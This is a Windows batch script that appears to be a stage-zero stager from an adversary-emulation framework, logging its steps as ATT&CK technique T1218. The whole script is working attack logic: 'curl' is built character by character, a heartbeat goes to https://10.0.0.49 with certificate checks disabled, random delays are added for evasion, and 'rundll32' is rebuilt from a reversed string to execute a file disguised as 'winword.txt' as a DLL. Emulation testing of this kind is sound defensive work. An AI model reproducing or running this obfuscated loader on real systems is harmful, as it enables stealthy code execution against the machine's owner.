@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM PHR_ constants (plain literals - NEVER encoded)
SET lcefwa=%APPDATA%\7709\16584f71
SET xxqguzf=Macula-Stage0-7709
SET akjdh=https://10.0.0.49
SET qwzxc=https://10.0.0.49/stage/2/icon.png?7709-10
SET yssem=BALAM-S2BO
SET kluzdx=10
SET wsmbdr=winword.txt
SET rmjsm=7709
SET jhxdhk=1

REM Create log directory if it doesn't exist
IF NOT EXIST "%APPDATA%\!kluzdx!\" mkdir "%APPDATA%\!kluzdx!" >nul 2>&1
SET logfile=%APPDATA%\!kluzdx!\macula-simulations.log

REM Initial random delay 30-60s
IF "!jhxdhk!"=="1" (echo [!DATE! !TIME!][DEBUG][!yssem!]: SCRIPT_START=initializing>> "!logfile!" 2>nul)
SET /A zd=%RANDOM% %% 31 + 30
IF "!jhxdhk!"=="1" (echo [!DATE! !TIME!][DEBUG][!yssem!]: SLEEP=!zd!s>> "!logfile!" 2>nul)
timeout /t !zd! /nobreak >nul 2>&1

REM Build "curl" character-by-character
SET a=c
SET b=u
SET c=r
SET d=l
SET tstcmd=%a%%b%%c%%d%.exe

REM Heartbeat check with debug logging
IF "!jhxdhk!"=="1" (echo [!DATE! !TIME!][DEBUG][!yssem!]: HEARTBEAT_START=!qwzxc!>> "!logfile!" 2>nul)
where /q %tstcmd%
IF ERRORLEVEL 1 (
    IF "!jhxdhk!"=="1" (echo [!DATE! !TIME!][DEBUG][!yssem!]: HEARTBEAT_ERROR=curl_not_found>> "!logfile!" 2>nul)
) ELSE (
    %tstcmd% -k -s -o nul "!qwzxc!"
    SET hbresult=!ERRORLEVEL!
    IF "!jhxdhk!"=="1" (echo [!DATE! !TIME!][DEBUG][!yssem!]: HEARTBEAT_RESULT=errorlevel=!hbresult!>> "!logfile!" 2>nul)
)

REM Delay method 2 (varying)
IF "!jhxdhk!"=="1" (echo [!DATE! !TIME!][DEBUG][!yssem!]: SLEEP=8s>> "!logfile!" 2>nul)
ping -n 9 127.0.0.1 >nul 2>&1

REM Change to output directory
IF "!jhxdhk!"=="1" (echo [!DATE! !TIME!][DEBUG][!yssem!]: CHDIR=!lcefwa!>> "!logfile!" 2>nul)
cd /d "!lcefwa!" 2>nul
SET cdresult=!ERRORLEVEL!
IF "!jhxdhk!"=="1" (echo [!DATE! !TIME!][DEBUG][!yssem!]: CHDIR_RESULT=errorlevel=!cdresult!>> "!logfile!" 2>nul)

REM Random delay 10-29s
SET /A rnd=%RANDOM% %% 20 + 10
IF "!jhxdhk!"=="1" (echo [!DATE! !TIME!][DEBUG][!yssem!]: SLEEP=!rnd!s>> "!logfile!" 2>nul)
timeout /t !rnd! /nobreak >nul 2>&1

REM Build "rundll32" using reverse string + substitution
SET rev=23lldnur
SET lolbin=
FOR /L %%i IN (8,-1,1) DO SET lolbin=!lolbin!!rev:~%%i,1!
SET lolbin=!lolbin!.exe

REM T1218 execution with debug logging
IF "!jhxdhk!"=="1" (echo [!DATE! !TIME!][DEBUG][!yssem!]: PROCESS_START=!lolbin! "!wsmbdr!",DllMain>> "!logfile!" 2>nul)
!lolbin! "!wsmbdr!",DllMain 2>nul
SET execresult=!ERRORLEVEL!
IF "!jhxdhk!"=="1" (echo [!DATE! !TIME!][DEBUG][!yssem!]: PROCESS_RESULT=errorlevel=!execresult!>> "!logfile!" 2>nul)

REM TTP logging (T1218)
SET ttpresult=0
SET errdetail=
IF !execresult! EQU 0 SET ttpresult=1
IF !execresult! NEQ 0 SET errdetail=load_failed

REM Normalize timestamp
SET normdate=!DATE:/=-!
SET normtime=!TIME:.=:!
SET normtime=!normtime: =0!

REM Write TTP log (silently fail if file cannot be written)
(echo [!normdate! !normtime:~0,12!][!yssem!]: !kluzdx!-!rmjsm!-T1218^|Signed Binary Proxy Execution=!ttpresult!:!errdetail!>> "!logfile!") 2>nul

REM Final delay using CHOICE
IF "!jhxdhk!"=="1" (echo [!DATE! !TIME!][DEBUG][!yssem!]: SLEEP=12s>> "!logfile!" 2>nul)
CHOICE /C Y /N /D Y /T 12 >nul 2>&1

IF "!jhxdhk!"=="1" (echo [!DATE! !TIME!][DEBUG][!yssem!]: SCRIPT_END=exit_code=!execresult!>> "!logfile!" 2>nul)

ENDLOCAL